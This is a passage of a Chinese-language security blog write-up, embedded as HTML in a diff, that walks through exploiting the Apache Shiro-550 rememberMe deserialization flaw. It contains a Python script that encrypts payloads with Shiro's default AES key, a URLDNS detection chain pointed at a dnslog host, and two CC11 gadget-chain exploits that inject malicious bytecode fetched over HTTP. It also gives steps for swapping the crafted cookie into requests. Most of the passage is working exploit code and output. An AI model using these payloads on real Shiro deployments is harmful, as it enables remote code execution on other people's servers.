Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br><br>        <span class="hljs-type">AesCipherService</span> <span class="hljs-variable">aesCipherService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AesCipherService</span>();<br>        <span class="hljs-type">ByteSource</span> <span class="hljs-variable">encrypt</span> <span class="hljs-operator">=</span> aesCipherService.encrypt(dataBytes, key);<br>        <span class="hljs-type">byte</span>[] encryptBytes = encrypt.getBytes();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64EncBytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.encode(encryptBytes), StandardCharsets.UTF_8);<br>        System.out.println(base64EncBytes);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-1-2-python实现"><a href="#3-1-2-python实现" class="headerlink" title="3.1.2 python实现"></a>3.1.2 python实现</h3><p>通过python实现相对来说比较复杂，我们需要到源码中查看相应的实现细节；跟入算法实现细节查看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301518800.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>根据上图我们可以得出的信息有：</p>
+<ul>
+<li><p>填充模式：PKCS#5（可以用chatgpt查一下填充方式）</p>
+</li>
+<li><p>加密模式：CBC</p>
+</li>
+<li><p>块大小block_size：默认大小</p>
+</li>
+</ul>
+<p>继续从super()深入，已经没有什么非常有价值的信息了，设置了默认密钥的大小以及一些其他信息，好像没啥用；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301523981.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>接下来查看一下<code>encrypt()</code>函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301525255.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>分析可以知道使用了随机初始化向量(IV)，其实有这些信息就已经够了；</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> uuid, base64<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> f.read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aesEnc</span>(<span class="hljs-params">data</span>) -&gt; <span class="hljs-built_in">str</span>:<br>    bs = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s : s + ((bs - <span class="hljs-built_in">len</span>(s)%bs) * <span class="hljs-built_in">chr</span>(bs - <span class="hljs-built_in">len</span>(s)%bs)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    ciphertext = base64.b64encode(iv+encryptor.encrypt(pad(data)))<br>    <span class="hljs-keyword">return</span> ciphertext<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    data = get_file_data(<span class="hljs-string">&#x27;shiro-550.bin&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(aesEnc(data))<br></code></pre></td></tr></table></figure>
+
+<h2 id="3-2-URLDNS链"><a href="#3-2-URLDNS链" class="headerlink" title="3.2 URLDNS链"></a>3.2 URLDNS链</h2><p>目前已经了解了漏洞利用的原理，构造Payload需要将利用链通过AES加密后在Base64编码，将Payload的值设置为 rememberMe 的 cookie 值进行发送，使Shiro对我们序列化的内容进行反序列化实现利用；</p>
+<p>由于 URLDNS 不依赖于 Commons Collections 包，只需要 JDK 的包就行，因此我们此处用来检测漏洞的存在；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">dnsurl</span> &#123;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException, IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;shiro-550.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename)).readObject();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://06c2bee4.log.dnslog.biz.&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashCode.setAccessible(<span class="hljs-literal">true</span>);<br>        hashCode.set(url, <span class="hljs-number">1234</span>);    <span class="hljs-comment">// 设置url变量中的hashCode变量值为1234</span><br>        HashMap&lt;URL, Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>        hashmap.put(url, <span class="hljs-number">1</span>);<br>        hashCode.set(url, -<span class="hljs-number">1</span>);<br>        serialize(hashmap);<br>        <span class="hljs-comment">//        deserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在进行payload编写的过程中先不进行反序列化，以免产生不必要的误解，然后将生成的<code>shiro-550.bin</code>加载到之前的python加密脚本中进行加密，运行结果如下图所示；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301627442.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>首先登录一下shiro，然后再次访问页面就会有Cookie字段，将 AES 加密出来的编码替换包中的 RememberMe Cookie，将 JSESSIONID 删掉，因为当存在 JSESSIONID 时，会忽略 rememberMe。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301628327.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>发送数据包后，即可收到dns请求，意味着确实进行了反序列化执行。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121500827.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="3-3-CC11利用链攻击"><a href="#3-3-CC11利用链攻击" class="headerlink" title="3.3 CC11利用链攻击"></a>3.3 CC11利用链攻击</h2><p>一开始编写了一下的序列化进行测试，发现最后是错误的，各位也可以看看我编写的攻击链。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.shlin;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> shlin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> DeserializeChain</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.shlin.CC11Exp.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/9/30 19:05</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC11Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvilBytes(String u) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(u).openConnection().getInputStream();<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> length;<br>        <span class="hljs-keyword">while</span> ((length = inputStream.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>            byteArrayOutputStream.write(buffer, <span class="hljs-number">0</span>, length);<br>        &#125;<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//        byte[] evilCodes = Files.readAllBytes(Paths.get(&quot;D:\\\\SecTools\\\\web\\\\DeserializeChain\\\\CC11\\\\src\\\\main\\\\java\\\\com\\\\shlin\\\\entity\\\\calc.class&quot;));</span><br>        <span class="hljs-type">byte</span>[] evilCodes = getEvilBytes(<span class="hljs-string">&quot;http://127.0.0.1:8000/calc.class&quot;</span>);<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TemplatesImpl</span>&gt; templatesClass = templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;evilCodes&#125;);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates, <span class="hljs-string">&quot;cc11&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        Transformer[] transformers = &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(hashMap, <span class="hljs-string">&quot;key&quot;</span>);<br>        hashMap.put(tiedMapEntry, <span class="hljs-number">123</span>);<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TiedMapEntry</span>&gt; tiedMapEntryClass = tiedMapEntry.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> tiedMapEntryClass.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        map.setAccessible(<span class="hljs-literal">true</span>);<br>        map.set(tiedMapEntry, decorateMap);<br>        serialize(hashMap);<br>        deserialize(<span class="hljs-string">&quot;cc11-ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;cc11-ser.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename)).readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301947557.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409301949792.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121500612.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>根据图片显示的报错可以知道，shiro无法加载Transformer这个类，因此导致上述的攻击链无法生效；我们需要取消载入Transformer这个类去实现攻击链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.shlin;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> shlin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> DeserializeChain</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.shlin.CC11Exp.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/9/30 19:05</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC11Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvilBytes(String u) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(u).openConnection().getInputStream();<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> length;<br>        <span class="hljs-keyword">while</span> ((length = inputStream.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>            byteArrayOutputStream.write(buffer, <span class="hljs-number">0</span>, length);<br>        &#125;<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//        byte[] evilCodes = Files.readAllBytes(Paths.get(&quot;D:\\\\SecTools\\\\web\\\\DeserializeChain\\\\CC11\\\\src\\\\main\\\\java\\\\com\\\\shlin\\\\entity\\\\calc.class&quot;));</span><br>        <span class="hljs-type">byte</span>[] evilCodes = getEvilBytes(<span class="hljs-string">&quot;http://127.0.0.1:8000/calc.class&quot;</span>);<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TemplatesImpl</span>&gt; templatesClass = templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;evilCodes&#125;);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates, <span class="hljs-string">&quot;cc11&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">newTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, newTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(hashMap, templates);<br>        hashMap.put(tiedMapEntry, <span class="hljs-number">123</span>);<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TiedMapEntry</span>&gt; tiedMapEntryClass = tiedMapEntry.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> tiedMapEntryClass.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        map.setAccessible(<span class="hljs-literal">true</span>);<br>        map.set(tiedMapEntry, decorateMap);<br>        serialize(hashMap);<br>        <span class="hljs-comment">//        deserialize(&quot;cc11-ser.bin&quot;);</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;cc11-ser.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename)).readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>ok，成功！</p>
+<h2 id="3-4-CB1利用链攻击"><a href="#3-4-CB1利用链攻击" class="headerlink" title="3.4 CB1利用链攻击"></a>3.4 CB1利用链攻击</h2><p>Shiro-550使用CB1利用链进行攻击的时候存在版本问题，shiro自带的Commons-BeanUtils是1.8.3版本的，在生成序列化串的时候也需要使用相应版本的Commons-BeanUtils；否则服务端会报错</p>
+<p>org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID &#x3D; -2044202215314119608, local class serialVersionUID &#x3D; -3490850999041592962</p>
+<p>根据Drun1baby师傅所说：</p>
+<p>如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 <code>serialVersionUID</code> 值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的 <code>serialVersionUID</code> 不同，则反序列化就会异常退出，避免后续的未知隐患。</p>
